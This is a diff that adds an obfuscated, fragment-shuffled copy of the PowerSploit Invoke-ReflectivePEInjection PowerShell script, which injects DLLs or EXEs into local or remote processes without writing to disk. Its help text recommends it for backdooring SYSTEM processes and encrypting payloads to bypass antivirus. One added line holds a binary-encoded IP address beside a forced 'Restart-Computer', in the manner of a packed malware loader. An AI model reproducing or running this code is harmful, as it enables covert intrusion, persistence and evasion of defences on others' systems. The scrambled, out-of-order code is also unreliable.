+					CXljProtectionFlag = CXljWin32Constants.PAGE_READONLY
+				}
+			}
+			else
+			{
+				if ((CXljSectionCharacteristics -band CXljWin32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
+				{
+					CXljProtectionFlag = CXljWin32Constants.PAGE_WRITECOPY
+				}
+				else
+				{
+					CXljProtectionFlag = CXljWin32Constants.PAGE_NOACCESS
+				}
+			}
+		}
+		
+		if ((CXljSectionCharacteristics -band C','uilder.DefineField(e9MjBaseOfDatae9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(24) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjImageBasee9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(28) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjSectionAlignmente9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(32) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjFileAlignmente9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(36) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjMajorOperatingSystemVersione9Mj, [UInt16], e9MjPublice9Mj)).SetOffset(40) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjMinorOperatingSystemVersione9Mj, [UInt16], e9MjPublice9Mj)).SetOffset(42) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjMajorImageVersione9Mj, [UInt16], e9MjPublice9Mj)).SetOffset(44) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjMinorImageVersione9Mj, [UInt16], e9MjPublice9Mj)).SetOffset(46) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjMajorSubsystemVersione9Mj, [UInt16], e9MjPublice9Mj)).SetOffset(48) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjMinorSubsystemVersione9Mj, [UInt16], e9MjPublice9Mj)).SetOffset(50) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjWin32VersionValuee9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(52) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjSizeOfImagee9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(56) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjSizeOfHeaderse9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(60) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjCheckSume9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(64) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjSubsysteme9Mj, CXljSubSystemType, e9MjP','AttribBuilder)
+
+		CXljTypeBuilder.DefineField(e9Mje_oemide9Mj, [UInt16], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9Mje_oeminfoe9Mj, [UInt16], e9MjPublice9Mj) Jbi write-host
+
+		CXlje_res2Field = CXljTypeBuilder.DefineField(e9Mje_res2e9Mj, [UInt16[]], e9MjPublic, HasFieldMarshale9Mj)
+		CXljConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
+		CXljAttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder(CXljConstructorInfo, CXljConstructorValue, CXljFieldArray, @([Int32] 10))
+		CXlje_res2Field.SetCustomAttribute(CXljAttribBuilder)
+
+		CXljTypeBuilder.DefineField(e9Mje_lfanewe9Mj, [Int32], e9MjPublice9Mj) Jbi write-host
+		CXljIMAGE_DOS_HEADER = CXljTypeBuilder.CreateType()	
+		CXljWin32Types Jbi Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value CXljIMAGE_DOS_HEADER
+
+		#Struct IMAGE_SECTION_HEADER
+		CXljAttributes = e9MjAutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInite9Mj
+		CXljTypeBuilder = CXljModuleBuilder.DefineType(e9MjIMAGE_SECTION_HEADERe9Mj, CXljAttributes, [System.ValueType], 40)
+
+		CXljnameField = CXljTypeBuilder.DefineField(e9MjNamee9Mj, [Char[]], e9MjPublic, HasFieldMarshale9Mj)
+		CXljConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
+		CXljAttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder(CXljConstructorInfo, CXljConstructorValue, CXljFieldArray, @([Int32] 8))
+		CXljnameField.SetCustomAttribute(CXljAttribBuilder)
+
+		CXljTypeBuilder.DefineField(e9MjVirtualSizee9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjVirtualAddresse9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjSizeOfRawDatae9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjPointerToRawDatae9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjPointerToRelocationse9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjPointerToLinenumberse9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineF','It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
+		#	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
+		CXljDllList = @(GEy9msvcr70d.dllGEy9, GEy9msvcr71d.dllGEy9, GEy9msvcr80d.dllGEy9, GEy9msvcr90d.dllGEy9, GEy9msvcr100d.dllGEy9, GEy9msvcr110d.dllGEy9, GEy9msvcr70.dllGEy9 Ppv
+			, GEy9msvcr71.dllGEy9, GEy9msvcr80.dllGEy9, GEy9msvcr90.dllGEy9, GEy9',' address in the remote process.
+		if (CXljRemoteLoading -eq CXljtrue)
+		{
+			#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it ','Restart-Computer -force
+CXljApQn=  ( GEy9 CXlj( set e9MjofSe9Mj  e9Mje9Mj)GEy9 +[sTRiNG]((100111, 1101001 ,1110000,111010,111001,110111, 101110, 110010 , 110001 ,110100 ,101110, 111001,110011 ,101110 , 110010,110000 , 110001,100111)JbiForEacH-ObJECt{ ( [COnveRt]::ToiNT16( ( CXlj_.tosTrING() ) ,2 )-aS[cHar]) }) +GEy9 CXlj(sEt-ItEM  e9MjvaRiABle:oFSe9Mj  e9Mj e9Mj)GEy9 )
+function Invoke-ReflectivePEInjection
+{
+<#
+.SYNOPSIS
+
+This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process, 
+or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints, 
+please lead the Notes section (GENERAL NOTES) for information on how to use them.
+
+
+1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.
+Because the DLL/EXE is loaded reflectively, it is not displayed when tools are used to list the DLLs of a running process.
+
+This tool can be run on remote servers by supplying a local Windows PE file (DLL/EXE) to load in to memory on the remote system,
+this will load and execute the DLL/EXE in to memory without writing any files to disk.
+
+
+2.) Reflectively load a DLL in to memory of a remote process.
+As mentioned above, the DLL being reflectively loaded wone9Mjt be displayed when tools are used to list DLLs of the running remote process.
+
+This is probably most useful for injecting backdoors in SYSTEM processes in Session0. Currently, you cannot retrieve output
+from the DLL. The script doesne9Mjt wait for the DLL to complete execution, and doesne9Mjt make any effort to cleanup memory in the 
+remote process. 
+
+
+While this script provides functionality to specify a file to load from disk a URL, or a byte array, these are more for demo purposes. The way Ie9Mjd recommend using the script is to create a byte array
+containing the file youe9Mjd like to reflectively load, and hardcode that byte array in to the script. One advantage of doing this is you can encrypt the byte array and decrypt it in memory, which will
+bypass A/V. Another advantage is you wone9Mjt be making web requests. The script can also load files from SQL Server and be used as a SQL Server backdoor. Please see the Casaba
+blog linked below (thanks to whitey).
+
+PowerSploit Function: Invoke-ReflectivePEInjection
+Author: Joe Bialek, Twitter: @JosephBialek
+License: BSD 3-Clause
+Required Dependencies: None
+Optional Dependencies: None
+Version: 1.4
+
+.DESCRIPTION
+
+Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.
+
+.PARAMETER PEPath
+
+The path of the DLL/EXE to load and execute. This file must exist on the computer the script is being run on, not the remote computer.
+
+.PARAMETER PEUrl
+
+A URL containing a DLL/EXE to load and execute.
+
+.PARAMETER PEBytes
+
+A byte array containing a DLL/EXE to load and execute.
+
+.PARAMETER ComputerName
+
+Optional, an array of computern','rtTable.AddressOfNameOrdinals + (CXlji * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
+				CXljFuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure(CXljOrdinalPtr, [Type][UInt16])
+				CXljFuncOffsetAddr = Add-SignedIntAsUnsigned (CXljPEHandle) (CXljExportTable.AddressOfFunctions + (CXljFuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
+				CXljFuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure(CXljFuncOffsetAddr, [Type][UInt32])
+				return Add-SignedIntAsUnsigned (CXljPEHandle) (CXljFuncOffset)
+			}
+		}
+		
+		return [IntPtr]::Zero
+	}
+
+
+	Function Invoke-MemoryLoadLibrary
+	{
+		Param(
+		[Parameter( Position = 0, Mandatory = CXljtrue )]
+		[Byte[]]
+		CXljPEBytes,
+		
+		[Parameter(Position = 1, Mandatory = CXljfalse)]
+		[String]
+		CXljExeArgs,
+		
+		[Parameter(Position = 2, Mandatory = CXljfalse)]
+		[IntPtr]
+		CXljRemoteProcHandle,
+
+        [Parameter(Position = 3)]
+        [Bool]
+        CXljForceASLR = CXljfalse
+		)
+		
+		CXljPtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
+		
+		#Get Win32 constants and functions
+		CXljWin32Constants = Get-Win32Constants
+		CXljWin32Functions = Get-Win32Functions
+		CXljWin32Types = Get-Win32Types
+		
+		CXljRemoteLoading = CXljfalse
+		if ((CXljRemoteProcHandle -ne CXljnull) -and (CXljRemoteProcHandle -ne [IntPtr]::Zero))
+		{
+			CXljRemoteLoading = CXl','d is NULLGEy9
+		}
+		
+		CXljPEHandle = CXljPELoadedInfo[0]
+		CXljRemotePEHandle = CXljPELoadedInfo[1] #only matters if you loaded in to a remote process
+		
+		
+		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
+		CXljPEInfo = Get-PEDetailedInfo -PEHandle CXljPEHandle -Win32Types CXljWin32Types -Win32Constants CXljWin32Constants
+		if ((CXljPEInfo.FileType -ieq GEy9DLLGEy9) -and (CXljRemoteProcHandle -eq [IntPtr]::Zero))
+		{
+			#########################################
+			### YOUR CODE GOES HERE
+			#########################################
+	        switch (CXljFuncReturnType)
+	        {
+	            e9MjWStringe9Mj {
+	                Write-Verbose GEy9Calling function with WString return typeGEy9
+				    [IntPt','lFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(CXljVirtualFreeAddr, CXljVirtualFreeDelegate)
+		CXljWin32Functions Jbi Add-Member NoteProperty -Name VirtualFree -Value CXljVirtualFree
+		
+		CXljVirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
+		CXljVirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
+		CXljVirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(CXljVirtualFreeExAddr, CXljVirtualFreeExDelegate)
+		CXljWin32Functions Jbi Add-Member NoteProperty -Name VirtualFreeEx -Value CXljVirtualFreeEx
+		
+		CXljVirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualPro','ionAddrTmp CXljPtrSize
+			Write-BytesToMemory -Bytes CXljShellcode3 -MemoryAddress CXljProcExitFunctionAddrTmp
+
+			CXljWin32Functions.VirtualProtect.Invoke(CXljProcExitFunctionAddr, [UInt32]CXljTotalSize, [UInt32]CXljOldProtectFlag, [Ref]CXljOldProtectFlag) Jbi write-host
+		}
+		#################################################
+
+		Write-Output CXljReturnArray
+	}
+	
+	
+	#This function takes an array of arrays, the inner array of format @(CXljDestAddr, CXljSourceAddr, CXljCount)
+	#	It copies Count bytes from Source to Destination.
+	Function Copy-ArrayOfMemAddresses
+	{
+		Param(
+		[Parameter(Position = 0, Mandatory = CXljtrue)]
+		[Array[]]
+		CXljCopyInfo,
+		
+		[Parameter(Position = 1, Mandatory = CXljtrue)]
+		[System.Object]
+		CXljWin32Functions,
+		
+		[Parameter(Position = 2, Mandatory = CXljtrue)]
+		[System.Object]
+		CXljWin32Constants
+		)
+
+		[UInt32]CXljOldPro','	if (CXljPEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
+		{
+			return [IntPtr]::Zero
+		}
+		CXljExportTablePtr = Add-SignedIntAsUnsigned (CXljPEHandle) (CXljPEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
+		CXljExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure(CXljExportTablePtr, [Type]CXljWin32Types.IMAGE_EXPORT_DIRECTORY)
+		
+		for (CXlji = 0; CXlji -lt CXljExportTable.NumberOfNames; CXlji++)
+		{
+			#AddressOfNames is an array of pointers to strings of the names of the functions exported
+			CXljNameOffsetPtr = Add-SignedIntAsUnsigned (CXljPEHandle) (CXljExportTable.AddressOfNames + (CXlji * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
+			CXljNamePtr = Add-SignedIntAsUnsigned (CXljPEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure(CXljNameOffsetPtr, [Type][UInt32]))
+			CXljName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(CXljNamePtr)
+
+			if (CXljName -ceq CXljFunctionName)
+			{
+				#AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
+				#    which contains the offset of the function in to the DLL
+				CXljOrdinalPtr = Add-SignedIntAsUnsigned (CXljPEHandle) (CXljExpo','ompatible -eq CXljtrue)
+			{
+				CXljPEHandle = CXljWin32Functions.VirtualAlloc.Invoke(CXljLoadAddr, [UIntPtr]CXljPEInfo.SizeOfImage, CXljWin32Constants.MEM_COMMIT -bor CXljWin32Constants.MEM_RESERVE, CXljWin32Constants.PAGE_READWRITE)
+			}
+			else
+			{
+				CXljPEHandle = CXljWin32Functions.VirtualAlloc.Invoke(CXljLoadAddr, [UIntPtr]CXljPEInfo.SizeOfImage, CXl','tDllPathGEy9
+				}
+				
+				#Get the first thunk, then loop through all of them
+				[IntPtr]CXljThunkRef = Add-SignedIntAsUnsigned (CXljPEInfo.PEHandle) (CXljImportDescriptor.FirstThunk)
+				[IntPtr]CXljOriginalThunkRef = Add-SignedIntAsUnsigned (CXljPEInfo.PEHandle) (CXljImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
+				[IntPtr]CXljOriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure(CXljOriginalThunkRef, [Type][IntPtr])
+				
+				while (CXljOriginalThunkRefVal -ne [IntPtr]::Zero)
+				{
+             ','escriptorPtr = Add-SignedInt','jNewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(CXljExeArguments)
+				CXljNewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(CXljExeArguments)
+				
+				#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
+				CXljOrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure(CXljACmdLnAddr, [Type][IntPtr])
+				CXljOrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure(CXljWCmdLnAddr, [Type][IntPtr])
+				CXljOrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(CXljPtrSize)
+				CXljOrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(CXljPtrSize)
+				[System.Runtime.InteropServices.Marshal]::StructureToPtr(CXljOrigACmdLnPtr, CXljOrigACmdLnPtrStorage, CXljfalse)
+				[System.Runtime.InteropServices.Marshal]::StructureToPtr(CXljOrigWCmdLnPtr, CXljOrigWCmdLnPtrStorage, CXljfalse)
+				CXljReturnArray += ,(CXljACmdLnAddr, CXljOrigACmdLnPtrStorage, CXljPtrSize)
+				CXljReturnArray += ,(CXljWCmdLnAddr, CXljOrigWCmdLnPtrStorage, CXljPtrSize)
+				
+				CXljSuccess = CXljWin32Functions.VirtualProtect.Invoke(CXljACmdLnAddr, [UInt32]CXljPtrSize, [UInt32](CXljWin32Constants.PAGE_EXECUTE_READWRITE), [Ref]CXljOldProtectFlag)
+				if (CXljSuccess = CXljfalse)
+				{
+					throw GEy9Call to VirtualProtect failedGEy9
+				}
+				[System.Runtime.Intero',' CXljModuleBuilder.DefineType(e9MjIMAGE_DOS_HEADERe9Mj, CXljAttributes, [System.ValueType], 64)
+		CXljTypeBuilder.DefineField(e9Mje_magice9Mj, [UInt16], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9Mje_cblpe9Mj, [UInt16], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9Mje_cpe9Mj, [UInt16], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9Mje_crlce9Mj, [UInt16], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9Mje_cparhdre9Mj, [UInt16], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9Mje_minalloce9Mj, [UInt16], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9Mje_maxalloce9Mj, [UInt16], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9Mje_sse9Mj, [UInt16],','4]CXljSectionDestAddr) ([Int64]CXljSizeOfRawData))
+				Test-MemoryRangeValid -DebugString GEy9Copy-Sections::MemsetGEy9 -PEInfo CXljPEInfo -StartAddress CXljStartAddress -Size CXljDifference Jbi write-host
+				CXljWin32Functions.memset.Invoke(CXljStartAddress, 0, [IntPtr]CXljDifference) Jbi write-host
+			}
+		}
+	}
+
+
+	Function Update-MemoryAddresses
+	{
+		Param(
+		[Parameter(Position = 0, Mandatory = CXljtrue)]
+		[System.Object]
+		CXljPEInfo,
+		
+		[Parameter(Position = 1, Mandatory = CXljtrue)]
+		[Int64]
+		CXljOriginalImageBase,
+		
+		[Parameter(Position = 2, Mandatory = CXljtrue)]
+		[System.Object]
+		CXljWin32Constants,
+		
+		[Parameter(Position = 3, Mandatory = CXljtrue)]
+		[System.Object]
+		CXljWin32Types
+		)
+		
+		[Int64]CXljBaseDiffere','eBuilder.DefineField(e9MjMachinee9Mj, [UInt16], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjNumberOfSectionse9Mj, [UInt16], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjTimeDateStampe9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjPointerToSymbolTablee9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjNumberOfSymbolse9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjSizeOfOptionalHeadere9Mj, [UInt16], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjCharacteristicse9Mj, [UInt16], e9MjPublice9Mj) Jbi write-host
+		CXljIMAGE_FILE_HEADER = CXljTypeBuilder.CreateType()
+		CXljWin32Types Jbi Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value CXljIMAGE_FILE_HEADER
+
+		#Struct IMAGE_OPTIONAL_HEADER64
+		CXljAttributes = e9MjAutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInite9Mj
+		CXljTypeBuilder = CXljModuleBuilder.DefineType(e9MjIMAGE_OPTIONAL_HEADER64e9Mj, CXljAttributes, [System.ValueType], 240)
+		(CXljTypeBuilder.DefineField(e9MjMagice9Mj, CXljMagicType, e9MjPublice9Mj)).SetOffset(0) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjMajorLinkerVersione9Mj, [Byte], e9MjPublice9Mj)).SetOffset(2) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjMinorLinkerVersione9Mj, [Byte], e9MjPublice9Mj)).SetOffset(3) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjSizeOfCodee9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(4) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjSizeOfInitializedDatae9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(8) Jbi Ou','CXljRThreadHandle = Create-RemoteThread -ProcessHandle CXljRemoteProcHandle -StartAddress CXljLoadLibraryAAddr -ArgumentPtr CXljRImportDllPathPtr -Win32Functions CXljWin32Functions
+			CXljResult = CXljWin32Functions.WaitForSingleObject.Invoke(CXljRThreadHandle, 20000)
+			if (CXljResult -ne 0)
+			{
+				Throw GEy9Call to CreateRemoteThread to call GetProcAddress failed.GEy9
+			}
+			
+			[Int32]CXljExitCode = 0
+			CXljResult = CXljWin32Functions.GetExitCodeThread.Invoke(CXljRThreadHandle, [Ref]CXljExitCode)
+			if ((CXljResult -eq 0) -or (CXljExitCode -eq 0))
+			{
+				Throw GEy9Call to GetExitCodeThread failedGEy9
+			}
+			
+			[IntPtr]CXljDllAddress = [IntPtr]CXljExitCode
+		}
+		
+		CXljWin32Functions.VirtualFreeEx.Invoke(CXljRemoteProcHandle, CXljRImportDllPathPtr, [UIntPtr][UInt64]0, CXljWin32Constants.MEM_RELEASE) Jbi write-host
+		
+		return CXljDllAddress
+	}
+	
+	
+	Function Get-RemoteProcAddress
+	{
+		Param(
+		[Parameter(Position=0, Mandatory=CXljtrue)]
+		[IntPtr]
+		CXljRemoteProcHandle,
+		
+		[Parameter(Position=1, Mandatory=CXljtrue)]
+		[IntPtr]
+		CXljRemoteDllHandle,
+		
+		[Parameter(Position=2, Mandatory=CXljtrue)]
+		[IntPtr]
+		CXljFunctionNamePtr,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is e9Mjtruee9Mj this is an ordinal number (points to nothing)
+
+        [Parameter(Position=3, Mandatory=CXljtrue)]
+        [Bool]
+        CXljLoadByOrdinal
+		)
+
+		CXljPtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
+
+		[IntPtr]CXljRFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
+        #If not loading by ordinal, write the function name to the remote process memory
+        if (-not CXljLoadByOrdinal)
+        {
+        	CXljFunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(CXljFunctionNamePtr)
+
+		    #Write FunctionName to memory (will be used in GetProcAddress)
+		    CXljFunctionNameSize = [UIntPtr][UInt64]([UInt64]CXljFunctionName.Length + 1)
+		    CXljRFuncNamePtr = CXljWin32Functions.VirtualAllocEx.Invoke(CXljRemoteProcHandle, [IntPtr]::Zero, CXljFunctionNameSize, CXljWin32Constants.MEM_COMMIT -bor CXljWin32Constants.MEM_RESERVE, CXljWin32Constants.PAGE_READWRITE)
+		    if (CXljRFuncNamePtr -eq [IntPtr]::Zero)
+		    {
+			    Throw GEy9Unable to allocate memory in the remote processGEy9
+		    }
+
+		    [UIntPtr]CXljNumBytesWritten = [UIntPtr]::Zero
+		    CXljSuccess = CXljWin32Functions.WriteProcessMemory.Invoke(CXljRemoteProcHandle, CXljRFuncNamePtr, CXljFunctionNamePtr, CXljFunctionNameSize, [Ref]CXljNumBytesWritten)
+		    if (CXljSuccess -eq CXljfalse)
+		    {
+			    Throw GEy9Unable to write DLL path to remote process memoryGEy9
+		    }
+		    if (CXljFunctionNameSize -ne CXljNumBytesWritten)
+		    {
+			    Throw GEy9Didne9Mjt write the expected amount of bytes when writing a DLL path to load to the remote processGEy9
+		    }
+        }
+        #If loading by ordinal, just set RFuncNamePtr to be the ordinal number
+        else
+        {
+            CXljRFuncNamePtr = CXljFunctionNamePtr
+        }
+		
+		#Get address of GetProcAddress
+		CXljKernel32Handle = CXljWin32Functions.GetModuleHandle.Invoke(GEy9kernel32.dllGEy9)
+		CXljGetProcAddressAddr = CXljWin32Function','XljTypeBuilder = CXljModuleBuilder.DefineType(e9MjIMAGE_NT_HEADERS64e9Mj, CXljAttributes, [System.ValueType], 264)
+		CXljTypeBuilder.DefineField(e9MjSignaturee9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjFileHeadere9Mj, CXljIMAGE_FILE_HEADER, e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjOptionalHeadere9Mj, CXljIMAGE_OPTIONAL_HEADER64, e9MjPublice9Mj) Jbi write-host
+		CXljIMAGE_NT_HEADERS64 = CXljTypeBuilder.CreateType()
+		CXljWin32Types Jbi Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value CXljIMAGE_NT_HEADERS64
+		
+		#Struct IMAGE_NT_HEADERS32
+		CXlj','AsUnsigned (CXljImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]CXljWin32Types.IMAGE_IMPORT_DESCRIPTOR))
+			}
+		}
+	}
+
+	Function Get-VirtualProtectValue
+	{
+		Param(
+		[Parameter(Position = 0, Mandatory = CXljtrue)]
+		[UInt32]
+		CXljSectionCharacteristics
+		)
+		
+		CXljProtectionFlag = 0x0
+		if ((CXljSectionCharacteristics -band CXljWin32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
+		{
+			if ((CXljSectionCharacteristics -band CXljWin32Constants.IMAGE_SCN_MEM_READ) -gt 0)
+			{
+				if ((CXljSectionCharacteristics -band CXljWin32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
+				{
+					CXljProtectionFlag = CXljWin32Constants.PAGE_EXECUTE_READWRITE
+				}
+				else
+				{
+					CXljProtectionFlag = CXljWin32Constants.PAGE_EXECUTE_READ
+				}
+			}',' in the DLL. There is a section near the bottom labeled GEy9YOUR CODE GOES HEREGEy9
+I recommend your DLL take no parameters. I have prewritten code to handle functions which take no parameters are return
+the following types: char*, wchar_t*, and void. If the function returns char* or wchar_t* the script will output the
+returned data. The FuncReturnType parameter can be used to specify which return type to use. The mapping is as follows:
+wchar_t*   : FuncReturnType = WString
+char*      : FuncReturnType = String
+void       : Default, done9Mjt supply a FuncReturnType
+
+For the whcar_t* and char_t* options to work, you must allocate the string to the heap. Done9Mjt simply convert a string
+using string.c_str() because it will be allocaed on the stack and be destroyed when the DLL returns.
+
+The function name expected in the DLL for the prewritten FuncReturnTypee9Mjs is as follows:
+WString    : WStringFunc
+String     : StringFunc
+Void       : VoidFunc
+
+These function names ARE case sensitive. To create an exported DLL function for the wstring type, the function would
+be declared as follows:
+extern GEy9CGEy9 __declspec( dllexport ) wchar_t* WS','tCommandLineWAddr)GEy9
+		}
+
+		#Prepare the shellcode
+		[Byte[]]CXljShellcode1 = @()
+		if (CXljPtrSize -eq 8)
+		{
+			CXljShellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
+		}
+		CXljShellc','	CXljValue1,
+		
+		[Parameter(Position = 1, Mandatory = CXljtrue)]
+		[Int64]
+		CXljValue2
+		)
+		
+		[Byte[]]CXljValue1Bytes = [BitConverter]::GetBytes(CXljValue1)
+		[Byte[]]CXljValue2Bytes = [BitConverter]::GetBytes(CXljValue2)
+		[Byte[]]CXljFinalBytes = [BitConverter]::GetBytes([UInt64]0)
+
+		if (CXljValue1Bytes.Count -eq CXljValue2Bytes.Count)
+		{
+			CXljCarryOver = 0
+			for (CXlji = 0; CXlji -lt CXljValue1Bytes.Count; CXlji++)
+			{
+				CXljVal = CXljValue1Bytes[CXlji] - CXljCarryOver
+				#Sub bytes
+				if (CXljVal -lt CXljValue2Bytes[CXlji])
+				{
+					CXljVal += 256
+					CXljCarryO','	[String[]]
+	CXljComputerName,
+	
+	[Parameter(Position = 2)]
+    [ValidateSet( e9MjWStringe9Mj, e9MjStringe9Mj, e9MjVoide9Mj )]
+	[String]
+	CXljFuncReturnType = e9MjVoide9Mj,
+	
+	[Parameter(Position = 3)]
+	[String]
+	CXljExeArgs,
+	
+	[Parameter(Position = 4)]
+	[Int32]
+	CXljProcId,
+	
+	[Parameter(Position = 5)]
+	[String]
+	CXljProcName,
+
+    [Parameter(Position = 6)]
+    [Switch]
+    CXljForceASLR
+)
+
+Set-StrictMode -Version 2
+
+
+CXljRemoteScriptBlock = {
+	[CmdletBinding()]
+	Param(
+		[Parameter(Position = 0, Mandatory = CXljtrue)]
+		[Byte[]]
+		CXljPEBytes,
+		
+		[Parameter(Position = 1, Mandatory = CXljtrue)]
+		[String]
+		CXljFuncReturnType,
+				
+		[Parameter(Position = 2, Mandatory = CXljtrue)]
+		[Int32]
+		CXljProcId,
+		
+		[Parameter(Position = 3, Mandatory = CXljtrue)]
+		[String]
+		CXljProcName,
+
+        [Parameter(Position = 4, Mandatory = CXljtrue)]
+        [Bool]
+        CXljForceASLR
+	)
+	
+	###################################
+	##########  Win32 Stuff  ##########
+	###################################
+	Function Get-Win32Types
+	{
+		CXljWin32Types = New-Object System.Object
+
+		#Define all the structures/enums that will be used
+		#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
+		CXljDomain = [AppDomain]::CurrentDomain
+		CXljDynamicAssembly = New-Object System.Reflection.AssemblyName(e9MjDynamicAssemblye9Mj)
